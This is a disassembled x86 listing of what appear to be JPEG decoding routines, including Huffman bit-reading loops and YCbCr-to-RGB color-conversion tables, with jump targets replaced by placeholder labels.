mov edx [ esp + 0x14 ]
mov edx [ edx + eax * 4 + 0x90 ]
mov [ esp + 0x1c ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
lea ecx [ ebx - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x14 ]
mov edx [ edx + eax * 4 + 0x90 ]
mov [ esp + 0x18 ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
mov esi edx
mov [ esp + 0x1c ] 0x9
sub ebx [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
movzx esi [ ecx + eax + 0x490 ]
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov [ esp + 0x18 ] 0x9
sub ebx [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
movzx esi [ ecx + eax + 0x490 ]
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x4
and esi 0xf
test esi esi
je r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x4
and esi 0xf
test esi esi
je r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
cmp eax 0xf
jne r-xdata
add ebp eax
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx ebx
push eax
mov edx [ esp + 0x20 ]
push edx
mov edx edi
lea eax [ esp + 0x34 ]
call sub_48f588
mov esi eax
test eax eax
jge r-xdata
cmp eax 0xf
jne r-xdata
add ebp eax
cmp esi ebx
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx ebx
push eax
mov edx [ esp + 0x1c ]
push edx
mov edx edi
lea eax [ esp + 0x34 ]
call sub_48f588
mov esi eax
test eax eax
jge r-xdata
inc [ esp + 0x8 ]
add [ esp + 0x28 ] 0x4
add [ esp + 0x24 ] 0x4
add [ esp + 0x20 ] 0x4
add ebp 0xf
sub ebx esi
jmp r-xdata
push esi
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
add ebp 0xf
sub ebx esi
mov ecx ebx
mov eax edi
sar eax cl
mov ecx esi
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ esi * 4 + rw-data ]
jge r-xdata
push esi
lea eax [ esp + 0x30 ]
mov ecx ebx
mov edx edi
call sub_48f43c
test eax eax
jne r-xdata
cmp ebx 0x8
jge r-xdata
inc ebp
cmp ebp 0x40
jl r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
cmp ebx 0x8
jge r-xdata
jmp r-xdata
mov edx eax
mov edx [ esi * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x34 ]
mov ebx [ esp + 0x38 ]
xor eax eax
jmp r-xdata
inc ebp
cmp ebp 0x40
jl r-xdata
mov eax [ ebp * 4 + rw-data ]
mov ecx [ esp + 0xc ]
mov esi edx
mov [ ecx + eax * 2 ] si
jmp r-xdata
sub_48fb54
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0xe8
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1bc ] eax
mov [ eax ] sub_48f008
mov [ eax + 0x4 ] sub_48f6f0
xor edx edx
add eax 0x38
xor ecx ecx
mov [ eax ] ecx
mov [ eax - 0x10 ] ecx
inc edx
add eax 0x4
cmp edx 0x4
jl r-xdata
pop esi
pop ebx
retn
sub_48fb94
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x400
mov ebx [ esi + 0x1c4 ]
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x10 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x14 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x18 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov edx 0xffffff80
imul ecx edx 0x166e9
add ecx 0x8000
mov esi [ ebx + 0x10 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0x1c5a2
add ecx 0x8000
mov esi [ ebx + 0x14 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffff492e
mov esi [ ebx + 0x18 ]
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffffa7e6
mov esi [ ebx + 0x1c ]
add ecx 0x8000
inc edx
mov [ esi + eax * 4 ] ecx
inc eax
cmp eax 0xff
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_48fc60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov ebx [ eax + 0x1c4 ]
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov esi 0x2
mov eax [ ebx + 0x2c ]
cmp esi eax
jbe r-xdata
push 0x0
push 0x1
mov eax [ ebx + 0x28 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
shl ecx 0x2
add ecx edx
lea eax [ ebx + 0x20 ]
xor edx edx
call sub_497770
mov esi 0x1
xor eax eax
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub ecx eax
cmp ecx esi
jae r-xdata
mov esi eax
mov ecx [ ebp + 0xc ]
add [ ecx ] esi
sub [ ebx + 0x2c ] esi
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx [ edx + eax * 4 ]
cmp esi 0x1
mov [ ebp - 0x14 ] ecx
jbe r-xdata
mov esi ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp - 0xc ]
inc [ eax ]
mov edx [ ebx + 0x20 ]
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x24 ] 0x1
mov eax [ edx + eax * 4 + 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov edx [ ebp - 0x8 ]
call [ ebx + 0xc ]
sub_48fd18
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx ecx
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x1c4 ]
mov esi edx
mov ecx [ ecx ]
shl ecx 0x2
add ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebx ]
mov edx [ ebp - 0x4 ]
call [ esi + 0xc ]
mov eax [ ebp + 0xc ]
inc [ eax ]
inc [ ebx ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_48fd50
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1c4 ]
mov eax [ ebp - 0x4 ]
mov esi [ ebx + 0x10 ]
mov eax [ eax + 0x144 ]
mov [ ebp - 0x24 ] esi
mov esi [ ebx + 0x14 ]
mov [ ebp - 0x28 ] esi
mov esi [ ebx + 0x18 ]
mov [ ebp - 0x2c ] esi
mov ebx [ ebx + 0x1c ]
mov [ ebp - 0x30 ] ebx
mov ebx [ edx ]
mov ebx [ ebx + ecx * 4 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ edx + 0x4 ]
mov ebx [ ebx + ecx * 4 ]
mov [ ebp - 0x18 ] ebx
mov edx [ edx + 0x8 ]
mov ecx [ edx + ecx * 4 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + 0x70 ]
mov edx [ edx ]
shr ecx 0x1
mov [ ebp - 0x20 ] ecx
cmp [ ebp - 0x20 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
test [ ecx + 0x70 ] 0x1
je r-xdata
mov ecx [ ebp - 0x18 ]
movzx ecx [ ecx ]
inc [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x10 ]
mov esi [ ebx + ecx * 4 ]
mov ebx [ ebp - 0x2c ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x28 ]
sar esi 0x10
mov ecx [ ebx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx ]
inc [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
lea ecx [ eax + ecx ]
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0xc ]
mov cl [ ecx + ebx ]
mov [ edx ] cl
add edx 0x3
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx ]
inc [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
lea ecx [ eax + ecx ]
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ebx [ ebp - 0xc ]
mov cl [ ecx + ebx ]
mov [ edx ] cl
add edx 0x3
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x0
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
movzx ecx [ ecx ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp - 0x30 ]
mov edi [ ebp - 0x10 ]
mov esi [ ebx + ecx * 4 ]
mov ebx [ ebp - 0x2c ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x28 ]
sar esi 0x10
mov ecx [ ebx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x8 ]
movzx ecx [ ecx ]
lea ebx [ eax + ecx ]
mov bl [ ebx + edi ]
mov [ edx + 0x2 ] bl
lea ebx [ eax + ecx ]
add eax ecx
mov bl [ ebx + esi ]
mov [ edx + 0x1 ] bl
mov ecx [ ebp - 0xc ]
mov al [ eax + ecx ]
mov [ edx ] al
sub_48fec8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c4 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x144 ]
mov esi [ eax + 0x10 ]
mov [ ebp - 0x30 ] esi
mov esi [ eax + 0x14 ]
mov [ ebp - 0x34 ] esi
mov esi [ eax + 0x18 ]
mov [ ebp - 0x38 ] esi
mov eax [ eax + 0x1c ]
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x8 ]
add eax eax
mov esi [ edx ]
mov esi [ esi + eax * 4 ]
mov [ ebp - 0x1c ] esi
mov esi [ edx ]
mov eax [ esi + eax * 4 + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0x4 ]
mov esi [ ebp - 0x8 ]
mov eax [ eax + esi * 4 ]
mov [ ebp - 0x24 ] eax
mov edx [ edx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x70 ]
shr edx 0x1
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0x2c ] 0x0
jbe r-xdata
mov edx [ ebp - 0x4 ]
test [ edx + 0x70 ] 0x1
je r-xdata
mov edx [ ebp - 0x24 ]
movzx edx [ edx ]
inc [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
movzx ebx [ ebx ]
mov [ ebp - 0x14 ] ebx
inc [ ebp - 0x28 ]
mov ebx [ ebp - 0x30 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x3c ]
mov edi [ ebp - 0x14 ]
mov esi [ ebx + edx * 4 ]
mov ebx [ ebp - 0x38 ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x34 ]
sar esi 0x10
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x1c ]
movzx edx [ edx ]
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
mov edx [ ebp - 0x1c ]
movzx edx [ edx ]
inc [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
mov edx [ ebp - 0x20 ]
movzx edx [ edx ]
inc [ ebp - 0x20 ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov edi [ ebp - 0x18 ]
mov [ edi + 0x2 ] bl
lea ebx [ ecx + edx ]
mov edi [ ebp - 0x18 ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ edi + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov ebx [ ebp - 0x18 ]
mov [ ebx ] dl
add [ ebp - 0x18 ] 0x3
mov edx [ ebp - 0x20 ]
movzx edx [ edx ]
inc [ ebp - 0x20 ]
mov ebx [ ebp - 0xc ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov edi [ ebp - 0x18 ]
mov [ edi + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov esi [ ebp - 0x18 ]
mov [ esi + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov ebx [ ebp - 0x18 ]
mov [ ebx ] dl
add [ ebp - 0x18 ] 0x3
dec [ ebp - 0x2c ]
cmp [ ebp - 0x2c ] 0x0
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0x30 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebx + esi * 4 ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x3c ]
mov edi [ ebp - 0x14 ]
mov esi [ ebx + edx * 4 ]
mov ebx [ ebp - 0x38 ]
add esi [ ebx + edi * 4 ]
mov ebx [ ebp - 0x34 ]
sar esi 0x10
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x1c ]
mov ebx [ ebp - 0xc ]
movzx edx [ edx ]
lea edi [ ecx + edx ]
mov bl [ edi + ebx ]
mov [ eax + 0x2 ] bl
lea ebx [ ecx + edx ]
lea edx [ ecx + edx ]
mov bl [ ebx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x10 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
xor edx edx
mov eax [ ebp - 0x20 ]
mov dl [ eax ]
mov eax [ ebp - 0xc ]
lea ebx [ ecx + edx ]
mov al [ ebx + eax ]
mov ebx [ ebp - 0x18 ]
mov [ ebx + 0x2 ] al
lea eax [ ecx + edx ]
mov ebx [ ebp - 0x18 ]
lea edx [ ecx + edx ]
mov al [ eax + esi ]
mov [ ebx + 0x1 ] al
mov eax [ ebp - 0x10 ]
mov cl [ edx + eax ]
mov eax [ ebp - 0x18 ]
mov [ eax ] cl
sub_490100
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x30
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x1c4 ] ebx
mov [ ebx ] sub_48fc4c
mov [ ebx + 0x8 ] eax
mov edx [ esi + 0x70 ]
imul edx [ esi + 0x78 ]
mov [ ebx + 0x28 ] edx
cmp [ esi + 0x138 ] 0x2
jne r-xdata
mov [ ebx + 0x4 ] sub_48fd18
mov [ ebx + 0xc ] sub_48fd50
xor eax eax
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x4 ] sub_48fc60
mov eax esi
mov edx 0x1
mov [ ebx + 0xc ] sub_48fec8
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x28 ]
call [ edi + 0x4 ]
mov [ ebx + 0x20 ] eax
jmp r-xdata
mov eax esi
call sub_48fb94
pop edi
pop esi
pop ebx
retn
sub_490180
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x400
mov ebx [ esi + 0x1c8 ]
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x8 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0xc ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x10 ] eax
mov eax esi
mov ecx 0x400
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x14 ] eax
xor eax eax
mov edx 0xffffff80
imul ecx edx 0x166e9
add ecx 0x8000
mov esi [ ebx + 0x8 ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0x1c5a2
add ecx 0x8000
mov esi [ ebx + 0xc ]
sar ecx 0x10
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffff492e
mov esi [ ebx + 0x10 ]
mov [ esi + eax * 4 ] ecx
imul ecx edx 0xffffa7e6
mov esi [ ebx + 0x14 ]
add ecx 0x8000
inc edx
mov [ esi + eax * 4 ] ecx
inc eax
cmp eax 0xff
jle r-xdata
pop edi
pop esi
pop ebx
retn
sub_490238
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x1c8 ]
mov ecx [ eax + 0x70 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ eax + 0x144 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x24 ] eax
mov edx [ edx + 0x14 ]
mov [ ebp - 0x28 ] edx
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
xor edi edi
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esi [ eax + esi * 4 ]
inc [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add [ ebp + 0xc ] 0x4
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] edx
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x2c ]
mov ebx [ ebp - 0x30 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x34 ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x1c ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
lea esi [ ecx + edx ]
mov bl [ esi + ebx ]
mov [ eax + 0x2 ] bl
mov ebx [ ebp - 0x28 ]
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi [ ebp - 0x24 ]
add ebx [ esi + edi * 4 ]
lea esi [ ecx + edx ]
sar ebx 0x10
lea edx [ ecx + edx ]
mov bl [ esi + ebx ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0xc ]
mov ebx [ ebx + esi * 4 ]
mov dl [ edx + ebx ]
mov [ eax ] dl
add eax 0x3
inc [ ebp - 0x14 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
inc [ ebp - 0x2c ]
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
sub_490340
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ebx
mov eax [ eax + 0x70 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc ecx
add [ ebp + 0xc ] 0x4
mov eax [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
mov esi [ ebx ]
mov eax [ eax ]
add esi [ ebp - 0xc ]
test edi edi
mov eax [ eax + ecx * 4 ]
jbe r-xdata
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov bl [ eax ]
mov [ esi ] bl
inc eax
add esi [ ebp - 0x4 ]
dec edi
test edi edi
ja r-xdata
sub_4903b0
push ebp
mov ebp esp
push ebx
push 0x0
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ eax + 0x70 ]
push eax
mov eax [ edx ]
mov edx ecx
mov ecx [ ebp + 0xc ]
call sub_497770
pop ebx
pop ebp
retn 0x8
sub_4903d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ eax + 0x70 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ edx ]
xor edi edi
mov ebx [ eax + ecx * 4 ]
mov eax [ ebp + 0xc ]
inc ecx
mov esi ebx
mov eax [ eax ]
add [ ebp + 0xc ] 0x4
cmp edi [ ebp - 0x4 ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov bl [ esi ]
mov [ eax ] bl
mov [ eax + 0x1 ] bl
mov [ eax + 0x2 ] bl
add eax 0x3
inc edi
inc esi
cmp edi [ ebp - 0x4 ]
jb r-xdata
sub_490418
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x1c8 ]
mov ecx [ eax + 0x70 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ eax + 0x144 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x28 ] eax
mov edx [ edx + 0x14 ]
mov [ ebp - 0x2c ] edx
jmp r-xdata
dec [ ebp + 0x8 ]
jns r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
xor edi edi
mov edx [ eax ]
mov eax [ ebp - 0x8 ]
mov edx [ edx + eax * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov esi [ eax + esi * 4 ]
inc [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
add [ ebp + 0xc ] 0x4
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x3c ] esi
mov esi [ ebp - 0x14 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x30 ]
mov ebx [ ebp - 0x34 ]
movzx edx [ edx ]
movzx ebx [ ebx ]
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x38 ]
movzx ebx [ ebx ]
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x20 ]
mov esi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi 0xff
add ebx edx
sub esi ebx
mov bl [ ecx + esi ]
mov [ eax ] bl
mov ebx [ ebp - 0x2c ]
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov ebx [ ebx + esi * 4 ]
mov esi [ ebp - 0x28 ]
add ebx [ esi + edi * 4 ]
mov esi 0xff
sar ebx 0x10
add ebx edx
sub esi ebx
mov bl [ ecx + esi ]
mov [ eax + 0x1 ] bl
mov ebx [ ebp - 0x24 ]
mov esi [ ebp - 0xc ]
add edx [ ebx + esi * 4 ]
mov ebx 0xff
sub ebx edx
mov dl [ ecx + ebx ]
mov [ eax + 0x2 ] dl
mov edx [ ebp - 0x3c ]
mov dl [ edx ]
mov [ eax + 0x3 ] dl
add eax 0x4
inc [ ebp - 0x18 ]
inc [ ebp - 0x3c ]
inc [ ebp - 0x38 ]
inc [ ebp - 0x34 ]
inc [ ebp - 0x30 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x1c ]
jb r-xdata
sub_49055c
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x18
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
mov [ ebx + 0x1c8 ] esi
mov [ esi ] sub_490558
mov eax [ ebx + 0x28 ]
dec eax
je r-xdata
cmp [ ebx + 0x24 ] 0x1
je r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov ecx [ ebx + 0x2c ]
dec ecx
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x3
je r-xdata
sub eax 0x2
jb r-xdata
mov [ ebx + 0x78 ] 0x1
mov eax [ ebx + 0x28 ]
cmp eax 0x1
je r-xdata
dec ecx
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x4
je r-xdata
jmp r-xdata
mov [ esi + 0x4 ] sub_4903b0
mov eax 0x1
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov [ ebx + 0x78 ] 0x3
cmp [ ebx + 0x28 ] 0x3
jne r-xdata
sub ecx 0x2
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x24 ] 0x1
jge r-xdata
cmp eax [ ebx + 0x24 ]
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1b
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
mov [ esi + 0x4 ] sub_490238
mov eax ebx
call sub_490180
jmp r-xdata
mov [ ebx + 0x78 ] 0x4
cmp [ ebx + 0x28 ] 0x5
jne r-xdata
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
